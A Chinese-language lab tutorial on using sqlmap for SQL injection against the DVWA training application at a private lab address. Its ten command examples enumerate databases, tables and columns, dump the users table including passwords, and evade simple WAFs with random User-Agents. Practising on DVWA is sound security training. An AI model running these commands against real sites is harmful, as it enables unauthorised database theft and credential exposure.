## 设置dvwa安全级别为**low**
## 获取有效的Cookie
登录后，使用浏览器开发者工具(F12)查看当前Cookie

或者使用Burp Suite拦截一个请求，获取Cookie值

您需要的Cookie应该包含PHPSESSID和security值
## 使用SQLMap进行测试

---

## **1. 基本注入测试**
```bash
sqlmap -u "http://192.168.214.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=您的会话ID; security=low" \
       --batch
```

### **参数说明：**
- **`-u` 或 `--url`**：指定目标URL，包含可注入参数（`id=1`）。  
- **`--cookie`**：提供当前会话的Cookie（`PHPSESSID`用于保持登录，`security=low`设置DVWA安全级别）。  
- **`--batch`**：自动选择默认选项，无需交互式确认（适合自动化测试）。  

---

## **2. 获取数据库信息**
```bash
sqlmap -u "http://192.168.214.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=您的会话ID; security=low" \
       --dbs \
       --batch
```

### **参数说明：**
- **`--dbs`**：枚举目标数据库服务器上的所有数据库名称（如`information_schema`、`dvwa`等）。  
- 其余参数同上（`-u`、`--cookie`、`--batch`）。  

---

## **3. 获取当前数据库名称**
```bash
sqlmap -u "http://192.168.214.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=您的会话ID; security=low" \
       --current-db \
       --batch
```

### **参数说明：**
- **`--current-db`**：获取当前正在使用的数据库名称（DVWA默认是`dvwa`）。  

---

## **4. 获取数据库表**
```bash
sqlmap -u "http://192.168.214.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=您的会话ID; security=low" \
       -D dvwa \
       --tables \
       --batch
```

### **参数说明：**
- **`-D dvwa`**：指定要操作的数据库（`dvwa`）。  
- **`--tables`**：枚举该数据库中的所有表（如`users`、`guestbook`）。  

---

## **5. 获取表结构（列名）**
```bash
sqlmap -u "http://192.168.214.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=您的会话ID; security=low" \
       -D dvwa \
       -T users \
       --columns \
       --batch
```

### **参数说明：**
- **`-T users`**：指定要操作的表（`users`）。  
- **`--columns`**：列出该表的所有列（如`user_id`, `first_name`, `password`）。  

---

## **6. 提取数据（Dump表内容）**
```bash
sqlmap -u "http://192.168.214.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=您的会话ID; security=low" \
       -D dvwa \
       -T users \
       --dump \
       --batch
```

### **参数说明：**
- **`--dump`**：提取并显示表中的所有数据（如用户名、密码等）。  

---

## **7. 使用POST请求测试（可选）**
```bash
sqlmap -u "http://192.168.214.1/dvwa/vulnerabilities/sqli/" \
       --data="id=1&Submit=Submit" \
       --cookie="PHPSESSID=您的会话ID; security=low" \
       --batch
```

### **参数说明：**
- **`--data="id=1&Submit=Submit"`**：指定POST请求的数据（如果注入点使用POST提交）。  

---

## **8. 使用随机User-Agent（绕过简单WAF）**
```bash
sqlmap -u "http://192.168.214.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=您的会话ID; security=low" \
       --random-agent \
       --batch
```

### **参数说明：**
- **`--random-agent`**：使用随机的HTTP User-Agent头，避免被WAF检测。  

---

## **9. 使用代理（Burp Suite抓包）**
```bash
sqlmap -u "http://192.168.214.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=您的会话ID; security=low" \
       --proxy="http://127.0.0.1:8080" \
       --batch
```

### **参数说明：**
- **`--proxy="http://127.0.0.1:8080"`**：通过Burp Suite等代理发送请求，方便分析流量。  

---

## **10. 提高检测级别（更全面测试）**
```bash
sqlmap -u "http://192.168.214.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=您的会话ID; security=low" \
       --level=3 \
       --risk=3 \
       --batch
```

### **参数说明：**
- **`--level=3`**（1-5）：提高检测深度（测试更多参数，如HTTP头）。  
- **`--risk=3`**（1-3）：提高风险等级（使用更激进的注入技术）。  

---

## **总结**
| 参数 | 作用 |
|------|------|
| `-u` | 指定目标URL |
| `--cookie` | 提供会话Cookie |
| `--batch` | 自动模式（无需交互） |
| `--dbs` | 枚举所有数据库 |
| `--current-db` | 获取当前数据库名 |
| `-D` | 指定数据库 |
| `--tables` | 枚举表 |
| `-T` | 指定表 |
| `--columns` | 获取列名 |
| `--dump` | 提取数据 |
| `--data` | POST请求数据 |
| `--random-agent` | 随机User-Agent |
| `--proxy` | 设置代理 |
| `--level` | 检测深度（1-5） |
| `--risk` | 风险等级（1-3） |
